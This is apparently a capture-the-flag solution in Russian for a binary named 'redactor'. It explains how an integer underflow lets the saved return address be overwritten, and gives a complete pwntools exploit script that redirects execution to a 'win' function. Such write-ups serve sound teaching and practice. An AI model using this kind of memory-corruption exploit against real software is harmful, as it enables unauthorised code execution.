# Solution
Уязвимость integer undeflow. Если `textLength` будет меньше чем `placeholderLength`, то `index`, смещение относительно `text` может быть произвольнымм, значит мы можем переписать сохранённый адресс возврата. PIE отключен, по этому адрес функции win будет постоянным.

```py
from pwn import *

io = process("redactor")

io.sendlineafter(b"Enter some text: ", b"A")
io.sendlineafter(b"Enter a placeholder: ", p64(ELF("redactor").sym.win))
io.sendlineafter(b"Enter the index of the stuff to redact: ", str(0x218).encode())

io.interactive()
```